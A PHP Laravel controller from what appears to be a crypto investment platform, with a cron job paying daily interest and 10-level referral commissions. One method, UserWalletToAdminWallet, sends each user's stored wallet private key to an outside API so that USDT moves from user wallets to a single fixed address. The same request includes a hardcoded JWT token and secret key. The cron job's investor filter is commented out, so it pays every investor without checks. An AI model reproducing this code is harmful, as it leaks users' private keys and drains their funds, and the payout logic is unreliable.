<?php

namespace App\Http\Controllers;

use App\Models\cron;
use App\Models\Holiday;
use App\Models\Investor;
use App\Models\Package;
use App\Models\referrals_settings;
use App\Models\Transactions;
use App\Models\User;
use App\Models\UserWalletData;
use App\Service\TransactionService;
use Carbon\Carbon;
use GuzzleHttp\Client;
use Illuminate\Support\Facades\DB;

class CronController extends Controller
{
    protected TransactionService $transactionService;

    public function __construct(TransactionService $transactionService)
    {
        $this->transactionService = $transactionService;
    }

    public function cronJob(): string
    {
        $todayName = Carbon::today()->format('l');
        cron::where('name', 'everyTime')->update([
            'last_cron' => Carbon::now(),
        ]);
        $holiday = Holiday::where('status', 1)
            ->where('day', $todayName)
            ->first();

//        $investors = Investor::where('status', 1)
//            ->where('return_type', 'daily')->where('status',1)
//            ->where('next_cron', '<=', Carbon::now()->subHours(24))
//            ->orderBy('next_cron', 'asc')->where('total_due_day', '>', 0)->get();

        $investors = Investor::all();



        if ($investors->isEmpty()) {
            return 'No Investor Found for Cron Job';
        }

        DB::transaction(function () use ($holiday, $investors) {
            foreach ($investors as $investor) {
                if ($holiday) {
                    $investor->update([
                        'next_cron' => Carbon::parse($investor->next_cron)->addDay()
                    ]);
                    continue;
                }

                $package = Package::find($investor->package_id);
                $user = User::find($investor->user_id);

                if (!$package || !$user) {
                    continue;
                }

                $percentageAmount = ($investor->investment * $package->interest_rate) / 100;

                $user->increment('profit_wallet', $percentageAmount);

                $this->transactionService->addNewTransaction(
                    "$user->id",
                    "$percentageAmount",
                    'interest',
                    '+',
                    'daily'
                );

                $investor->increment('total_receive_day', 1);
                $investor->decrement('total_due_day', 1);
                $investor->increment('total_receive', $percentageAmount);
                $this->addReferralBonus($user, $percentageAmount);

                $investor->update([
                    'next_cron' => Carbon::parse($investor->next_cron)->addDay(),
                    'last_cron' => Carbon::now(),
                ]);
            }
        });

        return $holiday ? 'Holiday Found: Only next_cron Updated' : 'Cron Job Executed Successfully';
    }



    private function addReferralBonus(User $referrer, float $baseAmount): void
    {
        $currentReferrer = $referrer->referredBy()->first();
        $level = 1;

        $commissionRates = [
            1 => 12,
            2 => 10,
            3 => 7,
            4 => 5,
            5 => 3,
            6 => 3,
            7 => 2,
            8 => 2,
            9 => 1,
            10 => 1,
        ];

        while ($currentReferrer && $level <= 10) {

            if (isset($commissionRates[$level]) && $currentReferrer->is_active) {
                // Count active directs once per referrer
                $activeDirects = $currentReferrer->referrals()
                    ->where('is_active', true)
                    ->with('investors')
                    ->count();

                $hasInvestment = Investor::where('user_id', $currentReferrer->id)->exists();

                if ($activeDirects >= $level && $hasInvestment) {
                    $bonus = ($baseAmount * $commissionRates[$level]) / 100;

                    if ($bonus > 0) {
                        $currentReferrer->increment('profit_wallet', $bonus);

                        $this->transactionService->addNewTransaction(
                            (string) $currentReferrer->id,
                            (string) $bonus,
                            'generation_income',
                            '+',
                            "Level {$level} Referral From {$referrer->name}"
                        );
                    }
                }
            }

            $currentReferrer = $currentReferrer->referredBy()->first();
            $level++;
        }
    }





    public function view()
    {
        $cron = cron::where('name', 'everyTime')->first();
        return view('admin.pages.cron', compact('cron'));
    }


    public function UserWalletToAdminWallet()
    {
        $client = new Client();
        $userWallet = UserWalletData::where('amount','>',0)->get();

        foreach ($userWallet as $wallet) {
            $response = $client->post('https://web3.blockmaster.info/api/send-usdt-transaction', [
                'form_params' => [
                    'to' => '0x62ec40f64b99b78888d374a9157d9268fe2b6a3d',
                    'from'=> $wallet->wallet_address,
                    'value'=>'1',
                    'sender_private_key' => $wallet->meta,
                    'jwt_token'=> 'WQLPKVEB8H4HISZ',
                    'secret_key'=>'P1D0IUSX9AB38O6',
                    'domain_name'=> 'my.mindchainwallet.com',
                ],
            ]);

            return $response->getBody();
        }
    }
}
